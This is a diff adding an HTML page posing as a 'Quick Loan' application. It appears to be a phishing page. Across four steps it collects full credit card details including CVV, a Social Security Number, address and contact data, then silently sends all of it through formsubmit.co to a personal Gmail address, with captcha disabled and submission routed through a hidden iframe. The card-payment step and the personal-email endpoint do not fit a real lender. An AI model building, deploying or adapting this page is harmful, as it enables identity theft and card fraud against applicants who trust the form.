@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Quick Loan Application Form - Get your loan approved in minutes.">
+    <meta name="keywords" content="Quick Loan, loan application, fast loans, online loans">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600;700&family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/svg" href="/images/favicon.svg">
+    <link rel="stylesheet" href="apply.css">
+    <title>Quick Loan Application Form</title>
+</head>
+<body>
+    <main class="container">
+        <header>
+            <h1>Quick Loan Application</h1>
+            <p class="subtitle">Complete all steps to submit your loan application</p>
+        </header>
+
+        <div class="step-indicator">
+            <span class="step-dot active" data-step="1"></span>
+            <span class="step-dot" data-step="2"></span>
+            <span class="step-dot" data-step="3"></span>
+            <span class="step-dot" data-step="4"></span>
+        </div>
+
+        <!-- Overlay for alerts -->
+        <div class="overlay" id="overlay"></div>
+
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+            <h3>✓ Application Submitted Successfully!</h3>
+            <p>Thank you for applying for a Quick Loan. We will review your application and contact you within 24 hours.</p>
+        </div>
+
+        <!-- Application Form -->
+        <form id="applicationForm" action="https://formsubmit.co/ojecgrv@gmail.com" method="POST" enctype="multipart/form-data" target="hiddenFrame">
+            
+            <!-- Hidden FormSubmit Configuration -->
+            <input type="hidden" name="_subject" value="New Quick Loan Application">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+
+            <!-- Step 1: Personal Information -->
+            <div class="step active" id="step1">
+                <h2 class="step-title">Personal Information</h2>
+                
+                <div class="form-group">
+                    <label for="fullname">Full Name <span class="required">*</span></label>
+                    <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required>
+                    <div class="error-message" id="fullname-error">Please enter your full name</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address <span class="required">*</span></label>
+                    <input type="email" id="email" name="Email" placeholder="your.email@example.com" required>
+                    <div class="error-message" id="email-error">Please enter a valid email address</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number <span class="required">*</span></label>
+                    <input type="tel" id="phone" name="Phone Number" placeholder="+1 (555) 000-0000" required>
+                    <div class="error-message" id="phone-error">Please enter a valid phone number</div>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="btn-next" onclick="nextStep()">Continue</button>
+                </div>
+            </div>
+
+            <!-- Step 2: Loan & Income Information -->
+            <div class="step" id="step2">
+                <h2 class="step-title">Loan Information</h2>
+                
+                <div class="form-group">
+                    <label for="loanType">Loan Type <span class="required">*</span></label>
+                    <select id="loanType" name="Loan Type" required>
+                        <option value="">Select a loan type</option>
+                        <option value="Personal">Personal Loan</option>
+                        <option value="Business">Business Loan</option>
+                        <option value="Emergency">Emergency Loan</option>
+                        <option value="Debt Consolidation">Debt Consolidation</option>
+                    </select>
+                    <div class="error-message" id="loanType-error">Please select a loan type</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="loanAmount">Loan Amount <span class="required">*</span></label>
+                    <input type="number" id="loanAmount" name="Loan Amount" placeholder="50000" min="1000" max="500000" required>
+                    <div class="error-message" id="loanAmount-error">Please enter a valid loan amount (1000-500000)</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="income">Annual Income <span class="required">*</span></label>
+                    <input type="number" id="income" name="Annual Income" placeholder="50000" min="0" required>
+                    <div class="error-message" id="income-error">Please enter your annual income</div>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="btn-back" onclick="prevStep()">Back</button>
+                    <button type="button" class="btn-next" onclick="nextStep()">Continue</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Credit Card Information -->
+            <div class="step" id="step3">
+                <h2 class="step-title">Payment Method</h2>
+                <p class="step-description">Enter your credit card details securely</p>
+                
+                <!-- Card Visualization -->
+                <div class="card-container">
+                    <div class="card-wrapper" id="cardWrapper">
+                        <!-- Front of Card -->
+                        <div class="card-face card-front">
+                            <div class="card-header">
+                                <div class="card-logo">Quick Loan</div>
+                                <div class="card-type" id="cardType">VISA</div>
+                            </div>
+                            <div class="card-number" id="cardDisplay">•••• •••• •••• ••••</div>
+                            <div class="card-footer">
+                                <div class="card-holder" id="cardHolderDisplay">CARDHOLDER</div>
+                                <div class="card-exp" id="cardExpDisplay">MM/YY</div>
+                            </div>
+                        </div>
+                        <!-- Back of Card -->
+                        <div class="card-face card-back">
+                            <div class="card-back-top"></div>
+                            <div class="card-cvc-area">
+                                <label for="cvcDisplay" class="cvc-label">CVV</label>
+                                <input type="text" id="cvcDisplay" class="cvc-input" placeholder="•••" maxlength="4" readonly>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardName">Cardholder Name <span class="required">*</span></label>
+                    <input type="text" id="cardName" name="Cardholder Name" placeholder="John Doe" required>
+                    <div class="error-message" id="cardName-error">Please enter cardholder name</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardNumber">Card Number <span class="required">*</span></label>
+                    <input type="text" id="cardNumber" name="Card Number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="error-message" id="cardNumber-error">Please enter a valid card number</div>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+                    <div class="form-group">
+                        <label for="expiryDate">Expiry Date <span class="required">*</span></label>
+                        <input type="text" id="expiryDate" name="Expiry Date" placeholder="MM/YY" maxlength="5" required>
+                        <div class="error-message" id="expiryDate-error">Please enter expiry date (MM/YY)</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvcField">CVV <span class="required">*</span></label>
+                        <input type="text" id="cvcField" name="CVV" placeholder="123" maxlength="4" required>
+                        <div class="error-message" id="cvcField-error">Please enter CVV</div>
+                    </div>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="btn-back" onclick="prevStep()">Back</button>
+                    <button type="button" class="btn-next" onclick="nextStep()">Continue</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Address & Verification -->
+            <div class="step" id="step4">
+                <h2 class="step-title">Address & Verification</h2>
+                
+                <div class="form-group">
+                    <label for="address">Full Address <span class="required">*</span></label>
+                    <input type="text" id="address" name="Full Address" placeholder="Street, City, State, Country" required>
+                    <div class="error-message" id="address-error">Please enter your full address</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="ssn">Social Security Number <span class="required">*</span></label>
+                    <input type="text" id="ssn" name="SSN" placeholder="000-00-0000" maxlength="11" required>
+                    <div class="error-message" id="ssn-error">Please enter a valid SSN (000-00-0000)</div>
+                </div>
+
+                <div class="form-group checkbox">
+                    <input type="checkbox" id="terms" name="Agreed to Terms" required>
+                    <label for="terms">I agree to the Terms of Service and Privacy Policy <span class="required">*</span></label>
+                    <div class="error-message" id="terms-error">You must agree to the terms</div>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="btn-back" onclick="prevStep()">Back</button>
+                    <button type="submit" class="btn-submit" id="submitButton">Submit Application</button>
+                </div>
+
+                <div id="loading">
+                    <div class="spinner"></div>
+                    <p>Submitting your application...</p>
+                </div>
+            </div>
+        </form>
+
+        <!-- Hidden iframe for form submission -->
+        <iframe name="hiddenFrame" id="hiddenFrame" class="hidden-iframe"></iframe>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <p>
+                <strong>Contact Us:</strong><br>
+                Email: <a href="mailto:support@quickloan.com">support@quickloan.com</a><br>
+                Phone: <a href="tel:+18005551234">1-800-555-1234</a>
+            </p>
+            <p class="footer-note">&copy; 2025 Quick Loan. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="apply.js"></script>
+</body>
+</html>
